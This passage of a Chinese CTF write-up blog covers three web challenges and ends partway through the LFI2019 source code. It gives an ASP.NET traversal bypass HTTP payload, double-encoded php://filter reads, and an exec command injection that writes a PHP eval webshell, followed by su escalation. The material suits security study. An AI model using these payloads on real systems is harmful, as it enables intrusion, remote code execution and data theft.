<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">bool</span> isBad = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Request.Form[<span class="string">&quot;filename&quot;</span>] != <span class="literal">null</span> ) &#123;</span><br><span class="line">        isBad = Request.Form[<span class="string">&quot;filename&quot;</span>].Contains(<span class="string">&quot;..&quot;</span>) == <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception ex) &#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!isBad) &#123;</span><br><span class="line">        Response.Write(System.IO.File.ReadAllText(<span class="string">@&quot;C:\inetpub\wwwroot\&quot;</span> + Request.Form[<span class="string">&quot;filename&quot;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception ex) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先<code>isBad</code>为<code>false</code>，如果POST的文件名包含<code>..</code>的话，<code>isBad</code>就会为<code>true</code>，就读不了文件了。</p>
<p>所以这里要bypass<code>..</code>去读取文件</p>
<p>So lets ask Google if there are any known bugs in ASP.NET …</p>
<p>The basic idea of that vulnerability is that, for POST requests, request validation prevents “dangerous content” (e.g. HTML tags or similar, such as <code>&lt;x</code>) in <em>POST form fields</em> by terminating the whole application. However, the same content in query-string fields will pass initial request validation and will “only” raise an exception on first access of <code>Request.QueryString[...]</code> (since that field is populated on first access?)</p>
<p>Similarly, for GET requests, request validation prevents “dangerous content” (e.g. HTML tags or similar, such as <code>&lt;x</code>) in <em>GET query-string fields</em> by terminating the whole application. However, the same content in form fields (i.e. in a request body encoded as <code>application/x-www-form-urlencoded</code>) will pass initial request validation and will “only” raise an exception on first access of <code>Request.Form[...]</code> (again, since that field is populated on first access?)</p>
<p>Nevertheless, query-string fields in a POST request are accessbile through <code>Request.QueryString[...]</code> and form fields submitted in the <em>request body</em> of a <strong>GET</strong> request (with content-type <code>application/x-www-form-urlencoded</code>) are accessible through <code>Request.Form[...]</code>.</p>
<p>Hence, we should be able to successfully submit the form by the sending a <strong>GET</strong> request without any query-string field but with the filename field in the <strong>request body</strong>. Further, by also including another form field in the request body that will trigger that “late” request validation bug (or is it a feature if Microsoft declared to won’t fix? 😜), e.g. a simple <code>&amp;o=&lt;x</code>, we should be able to trigger an exception on first access of <code>Request.Form[&quot;filename&quot;]</code> … and this is exactly what we need to escape from the first try-catch-block before changing <code>isBad</code>.</p>
<p>payload:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>52.197.162.211</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>42</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://52.197.162.211/</span><br><span class="line"></span><br><span class="line">filename=%2E%2E%5C%2E%2E%5CFLAG.txt&amp;o=%3Cx</span><br></pre></td></tr></table></figure>




<h2 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2><p>伪协议文件读取，有waf，通过二次编码绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;b&#x27;</span>; <span class="comment">#构造r的二次编码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii1</span> = <span class="number">0</span>; <span class="variable">$ascii1</span> &lt; <span class="number">256</span>; <span class="variable">$ascii1</span>++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$ascii2</span> = <span class="number">0</span>; <span class="variable">$ascii2</span> &lt; <span class="number">256</span>; <span class="variable">$ascii2</span>++) &#123;</span><br><span class="line">		<span class="variable">$aaa</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii1</span>.<span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii2</span>;</span><br><span class="line">		<span class="keyword">if</span>(urldecode(urldecode(<span class="variable">$aaa</span>)) == <span class="variable">$char</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$char</span>.<span class="string">&#x27;: &#x27;</span>.<span class="variable">$aaa</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//b: %6%32</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>?file=php://filter/read=convert.%62ase64-encode/resource=GWHT.php</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;max_execution_time&#39;, 5);</span><br><span class="line"></span><br><span class="line">if ($_COOKIE[&#39;pass&#39;] !&#x3D;&#x3D; getenv(&#39;PASS&#39;)) &#123;</span><br><span class="line">    setcookie(&#39;pass&#39;, &#39;PASS&#39;);</span><br><span class="line">    die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;count&quot;])) &#123;</span><br><span class="line">    $count &#x3D; $_GET[&quot;count&quot;];</span><br><span class="line">    if(preg_match(&#39;&#x2F;;|base64|rot13|base32|base16|&lt;\?php|#&#x2F;i&#39;, $count))&#123;</span><br><span class="line">    	die(&#39;hacker!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过robots.txt知道还有个check.php页面，同理读源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>抓个包看下</p>
<p><img src="https://img.npfs06.top/20210330194306.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们把这里的PASS改为GWHT</p>
<p>接下来就是命令执行exec(‘printf ‘’ . $count . ‘’ | wc -c’)，exec命令无回显，可以直接写入shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;|echo+&quot;&lt;%3f%3d+eval(\$_POST[&#x27;</span>shell<span class="string">&#x27;])%3f&gt;&quot;+&gt;+a.php&#x27;</span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">//exec(&#x27;printf \&#x27;&#x27;&#x27;|echo+&quot;&lt;%3f%3d+eval(\$_POST[&#x27;shell&#x27;])%3f&gt;&quot;+&gt;+a.php&#x27;&#x27;\&#x27; | wc -c&#x27;) </span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330195657.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>蚁剑链接</p>
<p><img src="https://img.npfs06.top/20210330195725.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>看了wp发现预期解是</p>
<p>发现了flag的所在地，但是没有权限，需要用GWHT或者root用户的权限才行。根目录下有一个<code>GWHT</code> 目录，</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@b3beb2760c83</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>ls /GWHT</span><br><span class="line">ls /GWHT</span><br><span class="line">README</span><br><span class="line">avenged</span><br><span class="line">dream</span><br><span class="line">findaas</span><br><span class="line">led</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
<p>在README中得到hash</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">877862561</span>ba0162ce610dd8bf90868ad414f0ec6.</span><br></pre></td></tr></table></figure>
<p>解得为：GWHTCTF</p>
<p>直接就能看flag了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@b3beb2760c83:&#x2F;var&#x2F;www&#x2F;html$ su - GWHT</span><br><span class="line">su - GWHT</span><br><span class="line">Password: GWHTCTF</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>


<h2 id="Windows-LFI2019"><a href="#Windows-LFI2019" class="headerlink" title="[Windows]LFI2019"></a>[Windows]LFI2019</h2><p>找不到源码，直接上github找的源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">        Developed by stypr.</span><br><span class="line">        Made in 2018, Releasing in 2019!</span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Baka flag-sama and seed-chan! &#x2F;&#x2F;</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&quot;display_errors&quot;,&quot;off&quot;);</span><br><span class="line">    @require(&#39;flag.php&#39;);</span><br><span class="line">    $seed &#x3D; md5(rand(PHP_INT_MIN,PHP_INT_MAX));</span><br><span class="line"></span><br><span class="line">    if($flag &#x3D;&#x3D;&#x3D; $_GET[&#39;trigger&#39;])&#123;</span><br><span class="line">        die(hash(&quot;sha256&quot;, $seed . $flag));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sessions are never used but we add that &#x2F;&#x2F;</span><br><span class="line">    ini_set(&#39;session.cookie_httponly&#39;, 1); @phpinfo();</span><br><span class="line">    ini_set(&#39;session.cookie_secure&#39;, 1); @phpinfo();</span><br><span class="line">    ini_set(&#39;session.use_only_cookies&#39;,1); @phpinfo();</span><br><span class="line">    ini_set(&#39;session.gc_probability&#39;, 1); @phpinfo();</span><br><span class="line">    &#x2F;&#x2F; but really, you can&#39;t really do something with sessions. &#x2F;&#x2F;</span><br><span class="line">    session_save_path(&#39;.&#x2F;sess&#x2F;&#39;);</span><br><span class="line">    session_name(&quot;lfi2019&quot;);</span><br><span class="line">    session_start();</span><br><span class="line">    session_destroy();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Flush directory for security purposes &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; Referenced it from StackOverflow: https:&#x2F;&#x2F;bit.ly&#x2F;2MxvxXE &#x2F;&#x2F;</span><br><span class="line">    function rrmdir($dir, $depth&#x3D;0)&#123; </span><br><span class="line">        if (is_dir($dir))&#123;</span><br><span class="line">            $objects &#x3D; scandir($dir); </span><br><span class="line">            foreach ($objects as $object)&#123; </span><br><span class="line">                if ($object !&#x3D; &quot;.&quot; &amp;&amp; $object !&#x3D; &quot;..&quot;)&#123; </span><br><span class="line">                    if(is_dir($dir.&quot;&#x2F;&quot;.$object))</span><br><span class="line">                        rrmdir($dir.&quot;&#x2F;&quot;.$object, $depth + 1);</span><br><span class="line">                    else</span><br><span class="line">                        unlink($dir.&quot;&#x2F;&quot;.$object); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if($depth !&#x3D; 0) rmdir($dir); </span><br><span class="line">    &#125;</span><br><span class="line">    function countdir($dir)&#123;</span><br><span class="line">        if (is_dir($dir))&#123;</span><br><span class="line">            $objects &#x3D; scandir($dir);</span><br><span class="line">            foreach ($objects as $object)&#123; </span><br><span class="line">                if ($object !&#x3D; &quot;.&quot; &amp;&amp; $object !&#x3D; &quot;..&quot;)&#123; </span><br><span class="line">                    $count +&#x3D; 1;</span><br><span class="line">                    if(is_dir($dir.&quot;&#x2F;&quot;.$object))</span><br><span class="line">                        $count +&#x3D; countdir($dir.&quot;&#x2F;&quot;.$object);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $count;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(countdir(&quot;.&#x2F;files&quot;));</span><br><span class="line">    if(countdir(&quot;.&#x2F;files&#x2F;&quot;) &gt;&#x3D; 100) @rrmdir(&quot;.&#x2F;files&#x2F;&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Here, kawaii path-san for you! &#x2F;&#x2F;</span><br><span class="line">    function path_sanitizer($dir, $harden&#x3D;false)&#123;</span><br><span class="line">        $dir &#x3D; (string)$dir;</span><br><span class="line">        $dir_len &#x3D; strlen($dir);</span><br><span class="line">        &#x2F;&#x2F; Deny LFI&#x2F;RFI&#x2F;XSS &#x2F;&#x2F;</span><br><span class="line">        $filter &#x3D; [&#39;.&#39;, &#39;.&#x2F;&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;];</span><br><span class="line">        foreach($filter as $f)&#123;</span><br><span class="line">            if(stripos($dir, $f) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; Deny SSRF and all possible weird bypasses &#x2F;&#x2F;</span><br><span class="line">        $stream &#x3D; stream_get_wrappers();</span><br><span class="line">        $stream &#x3D; array_merge($stream, stream_get_transports());</span><br><span class="line">        $stream &#x3D; array_merge($stream, stream_get_filters());</span><br><span class="line">        foreach($stream as $f)&#123;</span><br><span class="line">            $f_len &#x3D; strlen($f);</span><br><span class="line">            if(substr($dir, 0, $f_len) &#x3D;&#x3D;&#x3D; $f)&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; Deny length &#x2F;&#x2F;</span><br><span class="line">        if($dir_len &gt;&#x3D; 128)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">		&#x2F;&#x2F; Easy level hardening &#x2F;&#x2F;</span><br><span class="line">		if($harden)&#123;</span><br><span class="line">			$harden_filter &#x3D; [&quot;&#x2F;&quot;, &quot;\\&quot;];</span><br><span class="line">			foreach($harden_filter as $f)&#123;</span><br><span class="line">				$dir &#x3D; str_replace($f, &quot;&quot;, $dir);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Sanitize feature is available starting from the medium level &#x2F;&#x2F;</span><br><span class="line">        return $dir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; The new kakkoii code-san is re-implemented. &#x2F;&#x2F;</span><br><span class="line">    function code_sanitizer($code)&#123;</span><br><span class="line">        &#x2F;&#x2F; Computer-chan, please don&#39;t speak english. Speak something else! &#x2F;&#x2F;</span><br><span class="line">        $code &#x3D; preg_replace(&quot;&#x2F;[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\&#x3D;\(\)\[\]\;]&#x2F;u&quot;, &quot;*Nope*&quot;, (string)$code);</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Errors are intended and straightforward. Please do not ask questions. &#x2F;&#x2F;</span><br><span class="line">    class Get &#123;</span><br><span class="line">        protected function nanahira()&#123;</span><br><span class="line">            &#x2F;&#x2F; senpai notice me &#x2F;&#x2F;</span><br><span class="line">            function exploit($data)&#123;</span><br><span class="line">                $exploit &#x3D; new System();</span><br><span class="line">            &#125;</span><br><span class="line">            $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">        private $filename;</span><br><span class="line">        function __construct($filename)&#123;</span><br><span class="line">            $this-&gt;filename &#x3D; path_sanitizer($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        function get()&#123;</span><br><span class="line">            if($this-&gt;filename &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; wtf???? &#x2F;&#x2F;</span><br><span class="line">            if(!@file_exists($this-&gt;filename))&#123;</span><br><span class="line">                &#x2F;&#x2F; index files are *completely* disabled. &#x2F;&#x2F;</span><br><span class="line">                if(stripos($this-&gt;filename, &quot;index&quot;) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">                    return [&quot;msg&quot; &#x3D;&gt; &quot;you cannot include index files!&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F; hardened sanitizer spawned. thus we sense ambiguity &#x2F;&#x2F;</span><br><span class="line">                $read_file &#x3D; &quot;.&#x2F;files&#x2F;&quot; . $this-&gt;filename;</span><br><span class="line">                $read_file_with_hardened_filter &#x3D; &quot;.&#x2F;files&#x2F;&quot; . path_sanitizer($this-&gt;filename, true);</span><br><span class="line"></span><br><span class="line">                if($read_file &#x3D;&#x3D;&#x3D; $read_file_with_hardened_filter ||</span><br><span class="line">                    @file_get_contents($read_file) &#x3D;&#x3D;&#x3D; @file_get_contents($read_file_with_hardened_filter))&#123;</span><br><span class="line">                    return [&quot;msg&quot; &#x3D;&gt; &quot;request blocked&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; .. and finally, include *un*exploitable file is included. &#x2F;&#x2F;</span><br><span class="line">                @include(&quot;.&#x2F;files&#x2F;&quot; . $this-&gt;filename);</span><br><span class="line">                return [&quot;type&quot; &#x3D;&gt; &quot;success&quot;];</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;invalid filename (wtf)&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Put &#123;</span><br><span class="line">        protected function nanahira()&#123;</span><br><span class="line">            &#x2F;&#x2F; senpai notice me &#x2F;&#x2F;</span><br><span class="line">            function exploit($data)&#123;</span><br><span class="line">                $exploit &#x3D; new System();</span><br><span class="line">            &#125;</span><br><span class="line">            $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">        private $filename;</span><br><span class="line">        private $content;</span><br><span class="line">        private $dir &#x3D; &quot;.&#x2F;files&#x2F;&quot;;</span><br><span class="line">        function __construct($filename, $data)&#123;</span><br><span class="line">            global $seed;</span><br><span class="line">            if((string)$filename &#x3D;&#x3D;&#x3D; (string)@path_sanitizer($data[&#39;filename&#39;]))&#123;</span><br><span class="line">                $this-&gt;filename &#x3D; (string)$filename;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;filename &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;content &#x3D; (string)@code_sanitizer($data[&#39;content&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">        function put()&#123;</span><br><span class="line">            &#x2F;&#x2F; just another typical file insertion &#x2F;&#x2F;</span><br><span class="line">            if($this-&gt;filename &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; check if file exists &#x2F;&#x2F;</span><br><span class="line">            if(file_exists($this-&gt;dir . $this-&gt;filename))&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;file exists&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents($this-&gt;dir . $this-&gt;filename, $this-&gt;content);</span><br><span class="line">            &#x2F;&#x2F; just check if file is written. hopefully. &#x2F;&#x2F;</span><br><span class="line">            if(@file_get_contents($this-&gt;dir . $this-&gt;filename) &#x3D;&#x3D; &quot;&quot;)&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;file not written.&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            return [&quot;type&quot; &#x3D;&gt; &quot;success&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Triggering this is nearly impossible &#x2F;&#x2F;</span><br><span class="line">    class System &#123;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            global $seed;</span><br><span class="line">            